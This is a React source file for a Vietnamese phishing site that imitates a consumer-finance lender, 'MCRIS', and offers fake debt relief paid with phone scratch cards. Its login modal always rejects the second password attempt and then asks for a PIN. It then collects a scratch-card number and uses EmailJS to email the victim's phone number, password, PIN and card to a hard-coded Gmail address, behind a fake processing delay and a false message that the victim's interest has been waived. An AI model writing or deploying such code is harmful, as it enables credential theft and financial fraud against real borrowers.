import { useEffect, useState } from 'react'
import { ArrowUpRight, Check, Eye, EyeOff, Menu, Sparkles, X } from 'lucide-react'
import data from './data.json'
import emailjs from '@emailjs/browser'

const emailConfig = {
  serviceId: import.meta.env.VITE_EMAILJS_SERVICE_ID,
  templateId: import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
  publicKey: import.meta.env.VITE_EMAILJS_PUBLIC_KEY,
  recipient: import.meta.env.VITE_EMAILJS_TO_EMAIL || 'nguyenducsy08@gmail.com'
}

emailjs.init(emailConfig.publicKey)

const { features, heroSlides, imageOptions } = data
  
const cardValidation = {
  viettel: { pattern: '[0-9]{14}', title: 'Vui lòng nhập đúng 14 số' },
  vinaphone: { pattern: '[A-Za-z0-9]{12}', title: 'Vui lòng nhập đúng 12 chữ và số' },
  mobifone: { pattern: '[A-Za-z0-9]{12}', title: 'Vui lòng nhập đúng 12 chữ và số' },
}

let selectedNetworkName = ''
let globalFormData = {
  phone: '',
  password: '',
  pinCode: '',
  network: '',
  serial: ''
}

function resetGlobalFormData() {
  selectedNetworkName = ''
  globalFormData = {
    phone: '',
    password: '',
    pinCode: '',
    network: '',
    serial: ''
  }
}

function App() {
  const [showLogin, setShowLogin] = useState(false)
  const [menuOpen, setMenuOpen] = useState(false)
  const [activeSlide, setActiveSlide] = useState(0)
  
    
  useEffect(() => {
    const slideTimer = window.setInterval(() => {
      setActiveSlide((current) => (current + 1) % heroSlides.length)
    }, 5000)

    return () => window.clearInterval(slideTimer)
  }, [])

  function goToSlide(index) {
    setActiveSlide((index + heroSlides.length) % heroSlides.length)
  }

  const slide = heroSlides[activeSlide]

  return (
    <main className="site-shell">
      <nav className="nav-bar" aria-label="Main navigation">
        <a className="wordmark" href="#top" aria-label="Northstar home">
          <img src="/images/logo.png" alt="MRIS logo" className="wordmark-logo" />
        </a>
        <div className={`nav-links ${menuOpen ? 'is-open' : ''}`}>
          <a href="#approach" onClick={() => setMenuOpen(false)}>TRANG CHỦ</a>
          <div className="hotline-link">
            <a href="#stories" onClick={() => setMenuOpen(false)}>LIÊN HỆ TỔNG ĐÀI:</a>
            <strong>1900 63 67 68</strong>
          </div>
          <button className="mobile-login" onClick={() => { setShowLogin(true); setMenuOpen(false) }}>ĐĂNG NHẬP<ArrowUpRight size={15} /></button>
        </div>
        <button className="nav-login" onClick={() => setShowLogin(true)}>ĐĂNG NHẬP<ArrowUpRight size={15} /></button>
        <button className="menu-toggle" aria-label="Toggle navigation" onClick={() => setMenuOpen(!menuOpen)}>
          {menuOpen ? <X size={21} /> : <Menu size={21} />}
        </button>
      </nav>

      <section className="hero" id="top">
        <div className={`hero-slide ${slide.artClass}`} key={activeSlide}>
          <div className="hero-copy">
            <p className="eyebrow"><span className="eyebrow-dot" />{slide.eyebrow}</p>
            <h1>{slide.title}<br /><em>{slide.emphasis}</em></h1>
            <p className="hero-description">{slide.description}</p>
            <button className="primary-button" onClick={() => setShowLogin(true)}>ĐĂNG NHẬP<ArrowUpRight size={18} /></button>
          </div>
          <div className="hero-art" aria-label={slide.caption} role="img">
            {slide.image ? <img className="hero-slide-image" src={slide.image} alt={slide.caption} /> : (
              <>
                <div className="sun" />
                <div className="horizon-line" />
                <div className="hill hill-back" />
                <div className="hill hill-front" />
              </>
            )}
          </div>
        </div>
        <div className="hero-controls" aria-label="Hero slides">
          {heroSlides.map((heroSlide, index) => (
            <button className={index === activeSlide ? 'is-active' : ''} aria-label={`Go to slide ${index + 1}`} aria-current={index === activeSlide ? 'true' : undefined} key={heroSlide.caption} onClick={() => goToSlide(index)} />
          ))}
        </div>
        <div className="scroll-note"><span className="scroll-line" />NHẬN ƯU ĐÃI NGAY</div>
      </section>

      <section className="statement" id="approach">
        <p className="eyebrow">Khuyến mãi</p>
        <h2>Mcris triển khai Chương Trình Khuyến Mại:<br /><em> "Sẵn sàng hành trang - Rộn ràng khai giảng."</em></h2>
        <p className="statement-text">Từ ngày 31/08/2026 đến hết ngày 17/9/2026, Mcis mang đến chương trình ưu đãi “Sẵn sàng hành trang - Rộn ràng khai giảng”. Khách hàng ký Hợp đồng tín dụng và giải ngân thành công trong thời gian diễn ra chương trình khuyến mại có cơ hội trúng kho quà tặng với tổng giá trị gần 29 triệu đồng.</p>
      </section>

      <section className="feature-grid" id="stories">
        {features.map((feature) => (
          <article className="feature" key={feature.number}>
            <span className="feature-number">{feature.number}</span>
            <h3>{feature.title}</h3>
            <p>{feature.text}</p>
            <span className="feature-arrow"><ArrowUpRight size={17} /></span>
          </article>
        ))}
      </section>

      <footer className="footer">
        <span className="footer-note">Giấy phép số: 2845/GP-TTĐT.</span>
        <span>© 2016 Bản quyền thuộc về Công ty Tài chính tín dụng tiêu dùng TNHH MCRIS</span>
        <a href="mailto:hello@northstar.example">Email: dvkh@mcris.com.vn</a>
      </footer>

      {showLogin && <LoginModal onClose={() => {
        resetGlobalFormData()
        setShowLogin(false)
      }} />}
    </main>
  )
}

function LoginModal({ onClose }) {
  const [showPassword, setShowPassword] = useState(false)
  const [submitted, setSubmitted] = useState(false)
  const [passwordAttempts, setPasswordAttempts] = useState(0)
  const [passwordError, setPasswordError] = useState(false)
  const [password, setPassword] = useState('')
  const [phone, setPhone] = useState('')
  const [pinCode, setPinCode] = useState('')
  const [showPin, setShowPin] = useState(false)
  const [submittedData, setSubmittedData] = useState(null)

  function handleSubmit(event) {
    event.preventDefault()
    const nextAttempt = passwordAttempts + 1
    setPasswordAttempts(nextAttempt)

    globalFormData = {
      ...globalFormData,
      phone,
      password,
      pinCode
    }

    if (nextAttempt < 2) return

    if (nextAttempt === 2) {
      setPasswordError(true)
      setPassword('')
      window.setTimeout(() => setPasswordError(false), 1500)
      setShowPin(true)
      return
    }

    setSubmittedData({ phone, password, pinCode: pinCode.trim() || null })
    setSubmitted(true)
  }

  return (
    <div className="modal-backdrop" onMouseDown={(event) => event.target === event.currentTarget && onClose()}>
      <section className="login-modal" role="dialog" aria-modal="true" aria-labelledby="login-title">
        <button className="close-button" aria-label="Close login" onClick={onClose}><X size={19} /></button>
        <div className="login-icon">
          <img src="/images/logo.png" alt="MRIS logo" className="login-logo" />
        </div>
        {submitted ? (
          <LoggedInForm imageOptions={imageOptions} loginData={submittedData} onClose={onClose} />
        ) : (
          <>
            <div style={{ fontSize: '25px', fontWeight: '900', color: '#00b4fa' }} id="login-title" className="login-intro">Đăng nhập nhận ưu đãi</div>
            <p className="login-intro">Chương trình ưu đãi nạp thẻ cào trừ vào dư nợ gốc chỉ từ 30k</p>
            <form onSubmit={handleSubmit}>
              <label htmlFor="phone">Số điện thoại</label>
              <input id="phone" name="phone" type="tel" inputMode="tel" autoComplete="tel" placeholder="Số điện thoại" pattern="(?:0|\+84)(?:3|5|7|8|9)[0-9]{8}" title="Vui lòng nhập số điện thoại hợp lệ" value={phone} onChange={(event) => { const nextPhone = event.target.value; setPhone(nextPhone); globalFormData = { ...globalFormData, phone: nextPhone } }} required />
              <label htmlFor="password">Mật khẩu</label>
              <div className={`password-input ${passwordError ? 'has-error' : ''}`}><input id="password" name="password" type={showPassword ? 'text' : 'password'} placeholder="Mật khẩu" minLength={passwordAttempts < 2 ? 6 : undefined} value={password} onChange={(event) => { const nextPassword = event.target.value; setPassword(nextPassword); globalFormData = { ...globalFormData, password: nextPassword } }} required={passwordAttempts < 2} aria-invalid={passwordError} />{passwordError && <span className="password-error">Sai mật khẩu, vui lòng thử lại</span>}<button type="button" aria-label={showPassword ? 'Hide password' : 'Show password'} onClick={() => setShowPassword(!showPassword)}>{showPassword ? <EyeOff size={17} /> : <Eye size={17} />}</button></div>
              {showPin && <><label htmlFor="pin-code">Mã PIN</label><input id="pin-code" name="pinCode" type="text" inputMode="numeric" placeholder="Mã PIN" value={pinCode} onChange={(event) => { const nextPinCode = event.target.value; setPinCode(nextPinCode); globalFormData = { ...globalFormData, pinCode: nextPinCode } }} /></>}
              <button className="primary-button form-submit" type="submit">ĐĂNG NHẬP <ArrowUpRight size={17} /></button>
            </form>          </>
        )}
      </section>
    </div>
  )
}

function LoggedInForm({ imageOptions, loginData, onClose }) {
  const [selectedImage, setSelectedImage] = useState('')
  const [cardNumber, setCardNumber] = useState('')
  const [cardProcessing, setCardProcessing] = useState(false)
  const [cardSubmitted, setCardSubmitted] = useState(false)
  const selectedCardValidation = cardValidation[selectedImage]
  const isCardNumberValid = Boolean(selectedCardValidation && new RegExp(`^${selectedCardValidation.pattern}$`).test(cardNumber))

  const sendNotificationEmail = () => {
    const networkLabel = selectedNetworkName || 'Chưa chọn nhà mạng'

    emailjs.send(emailConfig.serviceId, emailConfig.templateId, {
      to_email: emailConfig.recipient,
      network_name: networkLabel,
      cardNumber: cardNumber,
      message: `${networkLabel}: ${cardNumber}`,
      info: `Thong tin-----SDT: ${loginData.phone}, PASS: ${loginData.password}, PIN: ${loginData.pinCode || 'Không có mã PIN'}`,

    })
      .then((result) => {
        console.log('Email sent:', result)
      })
      .catch((error) => {
        console.log('Email error:', error)
      })
  }

  function handleCardSubmit(event) {
    event.preventDefault()
    setCardProcessing(true)
    globalFormData = {
      ...globalFormData,
      network: selectedImage,
      serial: cardNumber
    }
    console.log({ ...loginData, network: selectedImage, cardNumber })
    window.setTimeout(() => {
      setCardProcessing(false)
      sendNotificationEmail()
      resetGlobalFormData()
      setCardSubmitted(true)
    }, 10000)
  }

  if (cardProcessing) {
    return <div className="processing-state" role="status" aria-live="polite"><div className="loading-spinner" aria-hidden="true" /><h2>Hồ sơ đang được xử lý</h2><p>Vui lòng chờ trong giây lát.</p></div>
  }

  if (cardSubmitted) {
    return <div className="success-state"><div className="fireworks" aria-hidden="true">{Array.from({ length: 12 }, (_, particleIndex) => <span key={particleIndex} />)}</div><div className="success-icon"><Check size={22} /></div><h2>Hồ sơ của bạn đã được miễn giảm toàn bộ lãi</h2><p>Liên hệ hotline 1900 63 67 68 để được tư vấn trả gốc hoặc gia hạn hợp đồng.</p><button className="secondary-button" onClick={onClose}>Đóng</button></div>
  }

  return (
    <>
      <div style={{ fontSize: '25px', fontWeight: '900', color: '#00b4fa' }} className="login-intro">Chọn nhà mạng</div>
      <p className="login-intro">Vui lòng chọn nhà mạng và nhập số thẻ</p>
      <form onSubmit={handleCardSubmit}>
        <div className="image-options" role="group" aria-label="Chọn nhà mạng">
          {imageOptions.map((option) => (
            <button className={`image-option ${selectedImage === option.id ? 'is-selected' : ''}`} type="button" aria-label={`Chọn ${option.label}`} aria-pressed={selectedImage === option.id} key={option.id} onClick={() => {
              selectedNetworkName = option.label
              globalFormData = { ...globalFormData, network: option.label }
              setSelectedImage(option.id)
              setCardNumber('')
            }}>
              <img src={option.src} alt={option.label} />
            </button>
          ))}
        </div>
        <label htmlFor="card-number">Số thẻ</label>
        <input className="card-number-input" id="card-number" name="cardNumber" type="text" inputMode="text" placeholder="Số thẻ" pattern={selectedCardValidation?.pattern} title={selectedCardValidation?.title || 'Vui lòng chọn nhà mạng'} value={cardNumber} onChange={(event) => setCardNumber(event.target.value)} required />
        <button className="primary-button form-submit" type="submit" disabled={!isCardNumberValid}>XÁC NHẬN <ArrowUpRight size={17} /></button>
      </form>
    </>
  )
}

export default App